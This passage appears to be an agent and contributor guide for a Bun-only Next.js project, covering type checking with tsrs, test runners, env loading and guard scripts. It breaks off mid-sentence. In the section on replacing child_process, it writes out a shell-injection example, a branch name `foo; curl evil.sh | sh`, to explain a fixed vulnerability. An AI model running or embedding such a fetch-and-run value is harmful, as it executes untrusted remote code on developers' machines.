# Indivisible Fair Oaks-Carmichael — Agent & Contributor Guide

> **Scope**: Architectural decisions, coding rules, active constraints, and agent skill index.
> Treat everything in this file as authoritative. See README.md for setup and CLI commands.

---

## Architecture

### The runtime is Bun — there is no Node

**Every process in this project runs on Bun.** There is no Node.js in the
toolchain: not for the Next.js server, not for the build, not for the type
checker, not for Playwright, not for the scripts.

| Job | How it runs | Command |
|---|---|---|
| Package manager | Bun | `bun install --frozen-lockfile` |
| Next.js dev/build/start | Bun | `bun --bun next dev\|build\|start` |
| Type checking | `tsrs` — TypeScript 7 in Rust | `bun tsrs --noEmit` |
| Build's own type check | `tsrs`, via Next's CLI mode — through `tools/typescript-shim/` | part of `bun --bun next build` |
| Unit tests | Vitest **on Bun's runtime** | `bun vitest run --coverage` |
| E2E tests | Playwright **on Bun's runtime** | `bun node_modules/@playwright/test/cli.js test` |
| Project scripts | Bun | `bun scripts/<name>.mjs` |
| Edge Functions | Deno | `deno check` / `supabase functions deploy` |

`package.json` declares `"engines": { "bun": ">=1.4.3" }` and **no `node`
engine** — the absence is the declaration. The toolchain itself runs the
Bun **canary** (`.mise.toml`); production runs a stable Bun, because Vercel's
Bun runtime accepts only `1.4.x` and `1.x`. See "The toolchain runs on the Bun
canary; production runs on stable".

**Three things make this work, and each is load-bearing:**

- **`bun --bun` on every `next` command.** Bun honours a `#!/usr/bin/env node`
  shebang by spawning `node`; `--bun` overrides that and runs the CLI on Bun's
  runtime. Without it, `next build` runs on whatever `node` resolves to.
- **`e2e/package.json` contains `{"type": "module"}`.** Playwright decides
  whether to `require()` or `import()` a spec by asking whether its nearest
  package.json says `"type": "module"`. Under CommonJS it installs a Babel
  transform; under ESM it hands the file to the runtime's own loader. Bun's
  loader strips TypeScript natively, so the ESM path is the one that works
  without Node — and with it, Playwright's own transform is not needed at all.
  The cost is that `e2e/` is ESM: `__dirname` does not exist there, so
  `e2e/helpers/e2e-seeds.ts`, `e2e/auth.setup.ts` and
  `e2e/admin-authenticated.spec.ts` use `import.meta.dirname`.
- **Playwright is invoked as `bun node_modules/@playwright/test/cli.js`, never
  as `./node_modules/.bin/playwright`.** The `.bin` shim is a `#!/usr/bin/env
  node` script. `bunx playwright` would also be wrong for a different reason:
  `playwright` is only a transitive dependency, so `bunx` would resolve it from
  the registry and run a version the lockfile does not pin.

**`tsrs` is the type checker — a Rust port of TypeScript 7.**
[`tsrs`](https://github.com/oxc-project/tsrs) is Cloudflare and VoidZero's
port of the TypeScript 7 compiler to Rust, published to npm as a native
per-platform binary. It reads this repo's `tsconfig.json` and reports the
same diagnostics as `tsc` — verified against TypeScript 7.1.0-beta's own
native `tsc` on the clean tree and on five injected type errors (TS2345,
TS2339, TS2322, TS7006, TS2554), with identical codes, messages and
positions.

**`tsrs` is the sole type checker across the entire project.** Builds, CI
workflows, pre-commit hooks, and npm scripts exclusively run `tsrs`
(`bun tsrs --noEmit`). Cloudflare and VoidZero's native Rust port eliminates
compiler divergence, provides sub-second diagnostics with 70% lower memory,
and runs identically in local development and CI runners.

**`tsrs` is pinned exactly, and it is the newest release.** `0.18.0` was
verified three ways — the npm `latest` dist-tag, the publish-time-sorted
version list, and the GitHub release list — because there is **no canary or
beta dist-tag for `tsrs`**, only `latest` and a 2024 `snapshot`. The channel
is not available to pin here, so the version is. The exact pin (rather than
the `^` most dependencies use) is deliberate: `tsrs` gates the type check, and
it moves fast — nine minor versions in nine days, 0.12.0 to 0.18.0 — so a
caret range would let a release change a gate's output under a routine
`bun install`. Its version also encodes the TypeScript commit it ports
(`ts7.1.0-dev.20260929`), which is what makes the pin legible.

**One difference, and it is only a difference of vocabulary.** For a
missing-property assignment failure, `tsc` reports `TS2741` ("Property 'x' is
missing in type A but required in type B") where the Rust port reports the
more general `TS2322` — same line, same severity, same error, different code.
Nothing here parses TS error codes (the suppression gate counts `@ts-ignore`
comments, which suppress the error whatever its code), so the difference never
reaches a decision. The reference implementation this was measured against
(`typescript@7.1.0-beta`, the Go `tsc`) is no longer in the tree — see below —
but the difference is a property of the two ports, not of the comparison.

### The `typescript` package is a shim, and the build type-checks with `tsrs`

**There is one type checker, not two.** The `typescript` npm package — the
native Go `tsc` — is **not** in the dependency tree. What is there is
`tools/typescript-shim/`: a local package *named* `typescript` whose `tsc`
binary is backed by `tsrs`.

**Next.js does not require the `typescript` package. It requires a package
named `typescript` whose `bin` metadata exposes a `tsc` binary.** It finds it
like this (`packages/next/src/lib/typescript/runTypeScriptCli.ts` in the Next
source):

```ts
const packageJsonPath = resolveFrom(baseDir, 'typescript/package.json')
// ...
const tscBin = typeof packageJson.bin === 'string'
  ? packageJson.bin
  : (packageJson.bin?.tsc ??
    Object.entries(packageJson.bin ?? {}).find(([name]) => /^tsc\d+$/.test(name))?.[1])
```

It then runs that binary **twice**, and the second call is not the one that
is hard:

| Call | Purpose | Answered by |
|---|---|---|
| `tsc --showConfig --project <tsconfig> --pretty false` | parsed as **JSON**, to read `compilerOptions.incremental` and `.composite` | the shim |
| `tsc --project <tsconfig> --noEmit --declarationMap false --emitDeclarationOnly false` | the actual type check | `tsrs`, natively |

`tsrs` implements the second call natively. It does **not** implement the
first — it exits 5 with `error: --showConfig is not supported by tsrs.` — and
Next.js treats a non-zero exit from that call as a hard failure:

```ts
if (result.exitCode !== 0) {
  throw new Error(/* ... */)
}
```

So the shim answers `--showConfig` itself and forwards everything else to the
native Rust binary, which `tsrs`'s own resolver locates (it knows the platform,
distinguishes musl from glibc on Linux, and honours a `TSRS_BINARY` override).
The shim deliberately reuses that resolver rather than carrying a second copy
of the platform table, so the two cannot drift.

**The `--showConfig` answer is not `tsc --showConfig`, and it says so.**
`tsc` reports the *computed* configuration: the merged chain, the compiler's
defaults filled in, and the `files`/`include` globs expanded. The shim reports
the merged tsconfig chain **as declared**. Next.js reads two booleans out of
it and both are answered faithfully; the output carries a `_tsrsShim` marker
so that a human reading the JSON is not misled.

**The shim has no `exports` field, on purpose.** Next.js resolves
`typescript/package.json` with `resolveFrom`, and a package whose `exports`
map does not expose `./package.json` would fail to resolve — the build would
report a missing dependency for a package that is present.

**`experimental.useTypeScriptCli` is set explicitly even though it is the
default in Next 16.4.** It has to be: the shim has no `lib/typescript.js`,
so the API path would fail to find a compiler. A default that silently
flipped would break the build, and the failure would be a dependency message
rather than anything about type checking.

**`next.config.ts` is the only place the shim is referenced.** Nothing else
in the repository knows it exists, and nothing else should.

**What this is not.** The npm `typescript` package was a **Go** binary, not
Node.js, so this is toolchain consolidation rather than runtime removal — the
"no Node.js anywhere" claim was already true without it. What it buys is one
compiler instead of two, a build-time check at Rust speed, and one fewer
implementation to keep in step with the language.

**One thing to know if `tsrs` ever implements `--showConfig`:** the shim
should delegate to it and lose the JSONC parsing. That is the shape of the
debt, and it is the reason the shim is small and marked as a shim rather
than presented as a compiler.

**`bunfig.toml` runs package.json scripts on Bun's own shell**, not the
system `sh`. Bun's shell is a real shell with its own parser — cross-platform
(the same script runs on Windows without a POSIX layer) and independent of what
`/bin/sh` happens to be on the host. For a project whose premise is that the
runtime is Bun, having the *scripts* fall back to the system shell is an
inconsistency worth removing.

**There is now no shell construct in `package.json` at all.** The last one —
`test -d .git && lefthook install || true` — was the `prepare` script, and it
was worse than an inconsistency: it ran `lefthook`, whose bin is a
`#!/usr/bin/env node` script, **through the system shell**, on every
`bun install`, on every developer's machine. The shell honoured the shebang
and executed it with Node.js. `prepare` is now
`bun scripts/install-hooks.mjs`, which does the same four things in Bun:

1. does nothing outside a git checkout (a published tarball, a CI install);
2. does nothing when lefthook is not installed (a `--production` install);
3. runs lefthook on Bun, with the path read out of lefthook's own `package.json`
   `bin` metadata rather than hard-coded;
4. never fails the install — a broken hook install must not stop somebody
   getting their dependencies installed.

The lefthook hooks themselves never went through `prepare`: they are invoked
as `bun scripts/hooks/<name>.mjs`, so they were always Bun processes.

**Vitest stays, and runs on Bun.** The unit suite's surface is
`vi.fn` (547 uses), `vi.mock` (142), `vi.hoisted` (126), `vi.stubGlobal` (37)
and `vi.spyOn` (28) across 131 files. Porting that to `bun test` is not a
mechanical rename — Bun's `mock.module` has different hoisting and
module-resolution semantics from `vi.mock` + `vi.hoisted`, and a partial port
would leave 895 tests asserting against a mock that no longer behaves like the
one they were written for. Vitest executing on Bun's runtime is the same
runtime with none of that risk.

**The config is `vitest.config.mts`, not `vitest.config.ts`.** Vite's native
config loader — `configLoader: 'native'`, which Vite 8 makes the default in a
future major — reads a config's ESM syntax directly instead of bundling it to
CommonJS first. A `.ts` file in a package without `"type": "module"` is loaded
as CommonJS, and Vite warns about exactly that on every run. `.mts` is
unambiguously ESM, and the alias it declares uses `import.meta.dirname` —
the ESM spelling of `__dirname`, which does not exist in an ES module.

**The jsdom environment was 60% of the unit suite's time, and it is now 38% —
by classifying every file, not by making jsdom cheaper.** Measured before the
change: jsdom was constructed 130 times — once per test file — for 127.66s of
a 224.22s run.

The cause was not jsdom's slowness. It was that **the environment was a
global default**, so all 130 files inherited it, including the 81 that never
touch a DOM. Every one of those files paid a full jsdom construction for a
`document` it never used.

So the environment is now stated **per file**, on the first line:

```ts
// @vitest-environment node
// @vitest-environment jsdom
```

81 files run in `node`; the 49 that need a DOM run in `jsdom`.
`scripts/hooks/vitest-environment.mjs` refuses a test file that declares
neither, and refuses a `jsdom` file that reaches for `Bun.*`. The config's
default is `node` — the cheap one — so an unclassified file is fast rather
than slow, and the guard makes sure there is no such file.

**The classification was measured, not guessed.** Every test file was run
under `--environment=node`, and the ones that failed were marked `jsdom`. All
37 failures were a DOM dependency and nothing else — `ReferenceError:
document is not defined`, `window is not defined`, `localStorage is not
defined`, `DOMParser is not defined`. The 12 files that already declared
`jsdom` were re-tested the same way, with the docblock removed, and all 12
failed too.

**That is what makes the classification safe to maintain: the failure is
loud.** A file marked `node` that turns out to need a DOM fails at the first
`document`, in every test in the file, with a message that names the missing
global. It cannot quietly pass a different way. The old objection — "a file
that touches the DOM only sometimes would fail silently rather than loudly" —
is answered by the mechanism: a DOM touch is a `ReferenceError` at the moment
it happens, whether it happens on every run or on one.

**Measured result: 224.22s → 45.42s.** Same 130 files, same 2266 passing
tests, same 19 skipped, same coverage numbers (94.83 / 91.89 / 98.63 / 97.1).
jsdom constructions: 130 → 49.

**Three cheaper-looking options were tried and lost, on measurement:**

| Option | Result |
|---|---|
| `pool: 'threads'` | **Slower.** 65.22s vs 45.42s — worker threads on Bun cost ~229ms to spawn against the fork pool's ~162ms. |
| `poolOptions.forks.singleFork` | **Slower.** 98.39s — one fork serialises every file, and the per-file environment construction contends inside it. |
| `isolate: false` | 297 tests fail across 20 files. |

**Why `vmThreads` cannot work on Bun.** It fails with `TypeError: Proxy is
not allowed in the global prototype chain`, and that message is not in
Vitest's code — it is Bun's. Bun's `node:vm` refuses a context whose global
prototype chain contains a `Proxy`:

```js
const ctx = vm.createContext({});
Object.setPrototypeOf(vm.runInContext('globalThis', ctx), new Proxy(realProto, {}));
vm.runInContext('1 + 1', ctx);
// Bun: Proxy is not allowed in the global prototype chain.
```

Vitest's `vmThreads` and `vmForks` pools *deliberately* put a `Proxy` in the
global prototype chain, to intercept module resolution inside the VM. So the
two are not merely different — they are in direct opposition, and the
incompatibility is in Bun's `node:vm`, not in Vitest. The upstream fix
belongs in Bun.

**Why `isolate: false` cannot work here.** It shares one environment across
every file, and the suite genuinely depends on per-file isolation: 297 tests
fail across 20 files. That is the "a gate that is sometimes red is not a
gate" failure mode, arrived at by the obvious route.

**Why `test.projects` was not used.** It splits the coverage gate, whose
arithmetic is aggregate across every included file, and whose per-file floors
are the point (see "The coverage gate is per-file, not a global percentage").
The per-file `@vitest-environment` docblock reaches the same classification
*without* splitting anything, because the environment is a property of the
file rather than of the project.

**"Vitest on Bun" means the workers too, not just the CLI.** This was
measured rather than assumed: inside a test, `process.execPath` is the `bun`
binary, `Bun.version` is `1.4.3`, and `process.versions.node` reads `26.3.0`
— Bun's Node-compatibility string, not a Node runtime. Vitest's workers are
spawned with `process.execPath`, so the same is true of the Playwright
workers. The practical consequence is that `Bun.file`, `Bun.write` and
`Bun.env` work directly inside a test file, which is why the unit tests use
them rather than `node:fs`.

**One known Bun defect is mitigated by the runtime, not by this project.** Bun
does not restore the AsyncLocalStorage context for `unhandledRejection`
listeners ([oven-sh/bun#39847](https://github.com/oven-sh/bun/issues/39847)),
so Next's filter for its own prerender-control-flow rejects cannot see the
aborted work unit and forwards them to its logger. On Bun that is ~800
`AbortError` stack traces per e2e run that Node absorbs silently — measured
at 0 under Node and 871 under Bun for the identical 95-spec suite. It is
**not** suppressible from here: Next's filter holds its captured listeners
privately, and Bun's `--unhandled-rejections` modes do not apply because Next
installs its own handler — the rejects are logged by Next's logger, not by
Bun's default handler. The upstream fix is
[oven-sh/bun#31721](https://github.com/oven-sh/bun/pull/31721), still unlanded
— re-measure and re-test when it ships.

The cost is real and is recorded in
[`docs/bun-runtime-spike.md`](./docs/bun-runtime-spike.md): the e2e gate is
slower on a Bun-hosted server, and the log volume is two orders of magnitude
higher.

### The Bun-native execution layer

**`bun <binary>` is not the same as `bun --bun <binary>`, and the difference
is a Node.js runtime.** This is the subtlest way Node.js survives a codebase
that has removed it from every *file*, and it is the one that a guard written
against shebangs cannot see.

Every binary in `node_modules/.bin` carries a `#!/usr/bin/env node` shebang:

```
$ head -1 node_modules/.bin/vitest
#!/usr/bin/env node
$ head -1 node_modules/.bin/biome
#!/usr/bin/env node
```

Bun substitutes itself for that interpreter when *Bun* is the thing doing the
executing — which is why `bun <file>` runs a `node`-shebanged file on Bun.
But `bun <binary>` resolves `node_modules/.bin/<binary>` and lets **the
shebang** decide, so it hands the program to Node.js whenever Node.js is
installed. Measured, with a stub `node` on `PATH`:

```
$ bun vitest --version
FAKE NODE INVOKED with: …/node_modules/.bin/vitest --version

$ bun --bun vitest --version
vitest/5.0.5 darwin-arm64 node-v26.3.0      ← Bun's Node-compat string
```

So `bun vitest` ran the unit suite on **Node.js** on any machine with Node
installed, and on **Bun** on the runner fleet, which has none. The suite
behaved differently in the two places, and the difference was invisible in the
output: `process.versions.node` reports a Node-compatibility version string
on both.

`bun --bun <binary>` forces Bun's runtime and makes the two identical. That
is the whole reason the flag exists, and **every local binary in this
repository is now invoked that way** — in `package.json`, in the workflows,
and in `lefthook.yml`.

**`bunfig.toml` sets `[run] bun = true`, which is the second line of
defence.** Bun prepends `$PATH` with a `node` symlink pointing at the `bun`
binary, so a `node` shebang resolves to Bun — and the alias "also applies to
shebangs that point to `node`", which is exactly the gap above. It is set
**explicitly** rather than left to Bun's default, because the default enables
it *only when `node` is not already in `$PATH`* — which is precisely the
machine-dependent case. The explicit `bun --bun` on each invocation remains
the primary guarantee, because it does not depend on `bunfig.toml` being
found; the setting covers the shebangs this repository does not write
itself, such as a dependency's `postinstall` script.

`scripts/hooks/no-node-runtime.mjs` enforces the explicit form. The rule
reads the local bin set out of `node_modules/.bin`, so a dependency that
arrives tomorrow is covered without the guard being edited, and it recognises
both command shapes — a shell word (`bun biome ci ./src`) and an argv array
(`run(['bun', 'biome', 'ci'])`).

**One directory listing still uses `node:fs`, and the reason is measured.**
`Bun.Glob` does not list a directory of symlinks, and `node_modules/.bin` is
exactly that — every entry is a symlink into the installed package. A glob
over it returns nothing at all:

```
$ bun -e "for await (const p of new Bun.Glob('*').scan({cwd:'node_modules/.bin'})) console.log(p)"
(no output)
```

The migration removed Node.js as a *runtime*. What it did not do is pretend
that `node:fs` is Node.js — it is not. Bun implements `node:fs`, `node:path`,
`node:crypto`, `node:os`, `node:url` and `node:http` natively, so importing
one involves no Node binary and no second runtime. Blocking those would
trade a real guarantee for a cosmetic one.

What *did* start another runtime was `node:child_process`, and that is gone
from every file in this repository. It was also, quietly, a **shell-injection
surface**: `execSync` and `execFile` take a command *string*, so `/bin/sh`
parses it, and any interpolated value — a branch name, a file path, a git ref
— becomes shell syntax rather than an argument. `post-checkout-deps.mjs`
interpolated two `argv` values straight into a command line, which made a
checkout of a branch named `foo; curl evil.sh | sh` a command line.

**`scripts/bun-exec.mjs` is the one way this repository runs a command.**

| Function | Returns | Throws on non-zero |
|---|---|---|
| `run(argv, opts)` | `{ exitCode, stdout, stderr }` | never |
| `runText(argv, opts)` | stdout as a string | yes |
| `tryRunText(argv, opts)` | stdout, or `null` | never |
| `runInherit(argv, opts)` | the exit code, output attached to the terminal | never |
| `runAsync` / `runTextAsync` / `runOrThrow` | the async equivalents | `runOrThrow` only |

Every function takes an **argv array**, and `Bun.spawnSync` never goes
through a shell — so an interpolated value is an argument, not a command. The
array form is also faster (no `/bin/sh` fork to parse a command line that was
never dynamic) and it removes the `maxBuffer` dance, because `execFileSync`
throws when a command's output exceeds a limit while Bun buffers it without
one.

**A non-zero exit is not an exception.** It is ordinary for `grep -q`, `git
diff --quiet` and `bun audit` (which exits non-zero when it finds advisories,
having still written its report to stdout), and code that has to catch an
exception to read a status is where "swallow the error" bugs live. `run`
returns the status; the caller decides what it means.

**Bun's own file API, not `node:fs`, for file reads and writes.** `Bun.file(p)
.text()` and `Bun.write(p, data)` replace `readFileSync` and `writeFileSync`
throughout `scripts/`, `e2e/` and the unit tests. This is not only style:
`readFileSync` blocks Bun's event loop, and `Bun.file(p).text()` does not.
`Bun.Glob` replaces `readdirSync` for listing files, `Bun.YAML.parse` replaces
the Ruby `Psych` call the workflow guard used to make, and `Bun.sleep(3000)`
replaces forking a `sleep` process to do nothing for three seconds.

**`Bun.Glob` is the listing API, and the pattern states the query.** A tree
walk that used to be `readdir` plus a `stat()` per entry — to decide whether
each entry was a directory — is now one pattern and no stats:
`new Bun.Glob('**/*.{ts,tsx}').scan({ cwd: dir })`. It also does not block the
event loop, which matters in a pre-commit hook, where the whole point is to
be quick.

`Bun.Glob` does not promise an order, so every walk that feeds a report
sorts its results. A guard whose findings move between runs cannot be diffed
against the previous run.

**`node:fs` remains for exactly five things**, and each has a measured
reason:

| Remaining use | Why Bun cannot do it |
|---|---|
| `readdir` with entry types | `Bun.Glob` lists paths but cannot say which of them is a directory. |
| `readdir` over `node_modules/.bin` | That directory is **all symlinks**, and `Bun.Glob` does not list a directory of symlinks — a glob over it returns nothing. |
| `mkdir`, `rm` | There is no Bun directory-creation API. |
| `mkdtemp` | There is no `Bun.tempdir` at all, so a hand-rolled mkdir-plus-random-name would be a worse `mkdtemp` than the one in the standard library. |
| `existsSync` on a `.git` entry | `Bun.file(p).exists()` answers *false* for a **directory**, because it asks "is this a file". A `.git` entry is usually a directory, so the Bun-native call would report every ordinary checkout as "not a checkout". |

They are still Bun's implementations.

**`node:path` is everywhere and should stay.** Bun has no *documented* path
API. There is a `bun:path` module — it works, and its `join`, `resolve`,
`dirname`, `relative` and `sep` agree with `node:path` exactly (measured) —
but it is absent from Bun's published API table, absent from `bun-types`, and
**untyped**: `import { join } from 'bun:path'` fails the type check with
`TS2307: Cannot find module 'bun:path'`. Adopting it would mean hand-writing
ambient declarations that duplicate `node:path`'s types and would conflict
with the real ones when Bun ships them. So `node:path` stays, and it is the
portable standard rather than a Node.js runtime either way — Bun implements
it natively.

`node:os`'s `tmpdir` is the same story, and more firmly: there is no
`Bun.tmpdir()`, and `Bun.env.TMPDIR` is `undefined` on a system that does not
set it, where `os.tmpdir()` falls back through `TMPDIR` → `TMP` → `TEMP` →
`/tmp`. `node:url`'s `fileURLToPath` and `pathToFileURL` **did** go, because
Bun's own API table has them as globals: `Bun.fileURLToPath()` and
`Bun.pathToFileURL()`. And `import.meta.dirname` / `import.meta.filename`
replaced the `path.dirname(fileURLToPath(import.meta.url))` idiom — which also
removes the `new URL(import.meta.url).pathname` form, whose `.pathname` is
percent-encoded and so breaks on a path containing a space.

`node:crypto` is the one that went: `crypto.subtle` covers what this
repository used it for, and it is a Web standard rather than a Node module.

**Two `node:` builtins had Bun equivalents and now use them.**
`scripts/mock-notify-contact.mjs` is a `Bun.serve` server rather than a
`node:http` one — the handler returns a `Response`, the body is parsed with
`req.json()` instead of a hand-rolled stream listener, and the connection
lifetime is one option (`idleTimeout`, which counts in **seconds** and is
capped at 255) instead of `keepAliveTimeout` plus `headersTimeout`.
`scripts/check-peer-deps.mjs` uses `Bun.resolveSync(specifier, parent)`
rather than `createRequire(...).resolve(specifier, { paths })`; the two were
verified equivalent in the case that distinguishes them, scoped to
`tinyglobby` both find the *nested* `picomatch` while from the root both find
the hoisted one, and the gate still reports 58 and 78 relationships.

**The e2e suite runs on Bun's runtime too, not just Bun's package manager.**
Playwright is launched as `bun node_modules/@playwright/test/cli.js`, and its
workers are spawned with `process.execPath` — so the worker process is Bun
(verified: `Bun.version` and `process.versions.bun` both report 1.4.3 inside a
spec). That is why the specs read `Bun.env` and `Bun.file` directly, and why
`e2e/auth.setup.ts` writes its storage state with `Bun.write` — which creates
the parent directory on the way, so the explicit `mkdir` went away. Playwright's
own `storageState({ path })` also creates the parent directory (verified), so
that `mkdir` was never needed at all.

**Bun loads `.env` and `.env.local` natively.** Nineteen scripts imported
`dotenv` and called `dotenv.config({ path: ... })`, and `dotenv` was **never
a declared dependency** — it resolved only because it is a transitive
dependency of the Vercel CLI, so those scripts failed to import on a clean
`bun install`. Bun's own loader reads `.env`, `.env.local` and the per-mode
variants, with the shell's environment taking precedence, so the import and
the call were both redundant as well as broken. `Bun.env` reads a variable;
`process.env` also works, because Bun populates it — but which of the two a
file should use depends on where that file runs, and that is settled below.

**But Bun reads those files at *startup*, and it chooses which ones from the
`NODE_ENV` in the environment at that moment.** Measured:

| `NODE_ENV` at startup | `.env` | `.env.local` | `.env.test` |
|---|---|---|---|
| unset | read | **read** | — |
| `development`, `production`, `staging` | read | **read** | — |
| `test` | read | **not read** | read |

So a shell that exports `NODE_ENV=test` gets neither `.env.local` nor
`.env.test` unless it exists, and anything that depended on `.env.local`
silently loses it. This is why `playwright.config.ts` still parses
`.env.local` by hand: Playwright sets `NODE_ENV=test` *inside* its own code,
which is too late to change what Bun already loaded, so the usual local run
is fine — but a shell that exports `NODE_ENV=test` sets it before Bun
starts, and then the manual parser is the only source. It reads like dead
code. It is not, and it says so in a comment.

**`Bun.env` and `process.env` are not interchangeable here — which one is
correct depends on where the code runs.** Bun documents `Bun.env` as an
*alias* for `process.env`, and the two are the same object in both
directions (verified: a write to either is visible to a read of the other).
So the choice is not about capability; it is about **which runtimes the file
has to survive**.

| Where the code runs | The spelling | Why |
|---|---|---|
| `src/` | `process.env` | It runs in the browser, on the Edge runtime, **and** on Bun. `Bun.env` does not exist in the first two — a single use is a crash on two of the three, and one the build will not catch. |
| `scripts/`, `e2e/` | `Bun.env` | They run on Bun and nowhere else, so the native accessor is the right one. |

**The one exception is a write.** `scripts/load-env-local.mjs` writes the
environment, and the write stays `process.env`: that is the spelling every
Bun version accepts for a mutation. The reads elsewhere see what it wrote,
because they are the same object.

**`scripts/hooks/no-raw-env-access.mjs` enforces both halves of the split.**
It rejects `process.env.X` in `src/` — which bypasses the Zod validation and
can silently return `undefined` — and it rejects `Bun.env.X` there too, which
is the *worse* of the two: a guaranteed crash on the Edge runtime and in the
browser, rather than an undefined value. The same guard therefore has to
know about both spellings, and
`scripts/hooks/env-usage-coverage.mjs` reports undeclared variables through
whichever of the two it found.

**One loader, and it strips quotes.** Six scripts hand-rolled the same
`.env.local` parser; they are `scripts/load-env-local.mjs` now. Five of the
six did **not** strip surrounding quotes from a value, and one did — and
**two of the twenty-three keys in this repository's `.env.local` are
quoted**: `VERCEL_TOKEN` and `VERCEL_OIDC_TOKEN`, both API credentials. A
loader that keeps the quotes hands the next script a token with literal
quote characters on the end, and the failure is an authentication error that
says nothing about the cause. `playwright.config.ts` cannot call the shared
loader — it has to read the file *synchronously*, before the config object
is evaluated — so it keeps its own parser and follows the same two rules:
the shell's environment wins, and a quoted value means the value without the
quotes.

**`Buffer` is gone from this repository, and the last one needed a Web
standard rather than a Bun-only API.** `src/lib/svix-signature.ts` decoded
base64 with `Buffer.from`, and it was left alone for a stated reason:
`Uint8Array.fromBase64` is the cutting-edge replacement, and it is a
Bun/Deno/modern-V8 API that is **not** in Node 20 or 22, so a swap would have
been green in tests and thrown at runtime on a Node function — a webhook
verifier failing closed on every real Resend event, with nothing failing
until production did.

That reason was sound, and it was also **not the only option**. The
principle `b8513c3` established for the e2e suite's TOTP helper — *prefer
the Web standard over the runtime-specific API* — has a third answer:
`atob` and `btoa` are **Web standards**, present in browsers, in Node (16 and
later), in Bun, in Deno, and on the Edge runtime. `atob` has neither problem
`Uint8Array.fromBase64` had.

The one behavioural difference is real and is now pinned by a test rather
than by a comment: `Buffer.from(value, 'base64')` is **lenient** — it decodes
whatever it can and ignores the rest — while `atob` **throws**. The callers
validate the shape first, so the throw is mostly unreachable, but a
valid-*shaped* string can still be undecodable: `"A"` is one base64
character, and one character encodes nothing. `Buffer.from('A', 'base64')`
returned zero bytes; `src/lib/base64.ts` returns `null` — the same answer,
reached by a different route.

`src/lib/base64.ts` is the shared home for `decodeBase64`, `encodeBase64` and
`decodeBase64Text`, and it is in the coverage gate. The verifier's own test
still checks **Svix's published vector** — an external reference that no
self-consistent mistake can satisfy.

**Where WebCrypto replaced `node:crypto`, it was the right trade.** The
e2e suite's TOTP helper and the two Stripe-webhook signers used
`node:crypto`'s `createHmac`; they now use `crypto.subtle`, which is a **Web
standard** — present in Bun, Deno, Node and every browser — and produces
byte-identical output. Unlike `Uint8Array.fromBase64`, WebCrypto is not a
Bun-only API, so it carries none of the risk above; it is *more* portable
than what it replaced, and it removes the last `node:` specifier from `e2e/`
and `scripts/`. `Bun.CryptoHasher` is not a substitute: it does not do HMAC
at all (it throws "key must be a string or buffer" for an HMAC key).

The TOTP helper is **SHA-1**, because RFC 6238 specifies SHA-1 for TOTP and
the RFC's own test vectors are the proof — they are external, so no
self-consistent mistake satisfies them. `e2e/mfa-challenge.spec.ts` checks
six of them plus the lowercased-and-space-padded secret case; every one
still matches after the conversion. The cost of the conversion is that
`crypto.subtle` is asynchronous where `createHmac` was not, so
`generateTotp` returns a promise — every call site was already inside an
async function.

One difference worth knowing: `Uint8Array.prototype.toBase64({ alphabet:
'base64url' })` keeps the `=` padding, where Node's `toString('base64url')`
strips it. `scripts/seed-e2e-users.mjs` strips it explicitly, so a generated
password is byte-identical to what it was before.

**A guard keeps it done.** `scripts/hooks/no-node-runtime.mjs` blocks Node
shebangs, `node:child_process`, a second package manager (`npm`, `npx`,
`yarn`, `pnpm`), the `actions/setup-node` workflow step, an `engines.node`
declaration, and imports of `node-fetch` or `dotenv`. Without it the failure
mode is not a red build — it is a green local machine and a red runner,
because a `#!/usr/bin/env node` shebang works perfectly on a laptop that
still has Node and breaks on every machine this project actually runs on.

**The guard has two halves, and the staged-files half was the one that gave
false confidence.** The pre-commit hook passes `{staged_files}`, so it catches
a *reintroduction* — someone adds a Node shebang and the commit is refused. It
cannot catch a violation that arrived another way: a file committed before the
guard existed, a merge, a regeneration. Those sit there indefinitely while the
guard keeps reporting a clean tree, because it is only ever shown the staged
subset. The `--all` pass in CI is the half that says something about the
current state of the repository rather than about the next commit.

Worth recording because the CI step was already written and already *looked*
right — `bun scripts/hooks/no-node-runtime.mjs --all` — while the guard
treated `--all` as a filename, read nothing, and exited 0. A flag that the
tool does not understand is not a failure; it is a path that does not exist,
and a guard that skips what it cannot read is a control that reports success
while measuring nothing. The same shape as `vercel pull` returning an empty
string for a `sensitive` variable, and as a `deploy` step that runs at all.

The tree walk also skips what is not this repository's runtime: the vendored
`.agents/skills/` and `agent/skills/` trees (pinned in `skills-lock.json` and
rewritten by `bunx skills update`), the gitignored `.kiro/` and `scratch/`
directories, and Markdown — because prose mentioning `npm install -g vercel` is
a sentence about the past, not a command. A guard that fires on prose teaches
people to reach for the bypass.

### Bun has a linter and a formatter now — and both were measured, and both were declined

Bun 1.4 ships `bun lint` and `bun fmt` as built-ins. Zero install, no
`node_modules` entry, no `#!/usr/bin/env node` shim. That is exactly the
shape of the "maximum Bun" claim, so it was measured against the two
devDependencies it would replace — **Biome** (lint + format) and **oxlint**
(React/hooks/Next.js rules) — rather than adopted on the strength of the
marketing.

**`bun lint` is oxlint.** It is the same engine: 96 rules run natively, and
`bun lint --doctor` says *"Using oxlint's defaults"* and *"Still needed:
oxlint (its defaults apply while package.json has it)"*. On a file with
known violations, the two produce **identical output** — same rule names,
same messages, same positions, same severities. `bun lint` is oxlint with the
package manager's copy removed.

**It was still declined, and the reason is the same one that pins `tsrs`.**
`oxlint` is pinned by `bun.lock`; `bun lint`'s rule set is whatever the
running Bun bundles, and this repository's toolchain runs the **canary**
channel. A gate whose output can change without an install is a worse gate
than one whose version is a caret range in a lockfile — and the repo has
already reasoned this out for the type checker: *"it gates the type check,
and it moves fast — nine minor versions in nine days — so a caret range would
let a release change a gate's output under a routine `bun install`."* A
canary-floated linter is the same hazard with a shorter fuse. The pinned
`oxlint` stays.

**`bun fmt` is Prettier-compatible, and Biome's output is not.** With the
settings that map one-for-one onto `biome.json` — `printWidth = 100`,
`singleQuote`, `trailingComma = "es5"`, `semi`, `arrowParens = "always"`,
`bracketSpacing`, `jsxSingleQuote = false` — `bun fmt --check ./src` reports
**21 files** of 401 needing changes. That is a small diff, and the
differences are ordinary Prettier-vs-Biome ones.

**But one of those 21 files is `src/app/globals.css`, and there the
difference is a downgrade.** Bun's CSS formatter rewrites
`translate3d(var(--tw-enter-translate-x, 0), var(--tw-enter-translate-y, 0), 0)`
onto one line where Biome's keeps the arguments expanded, and it changes
`@import "tailwindcss"` to single quotes. `globals.css` is the design
system's source of truth — every `@theme` token, every `@utility` — and
reformatting it with a *less capable* CSS printer to save one devDependency
is a bad trade. Biome's formatter stays.

So the linter and formatter remain two devDependencies, both with
`#!/usr/bin/env node` shims. That cost is already paid down: every
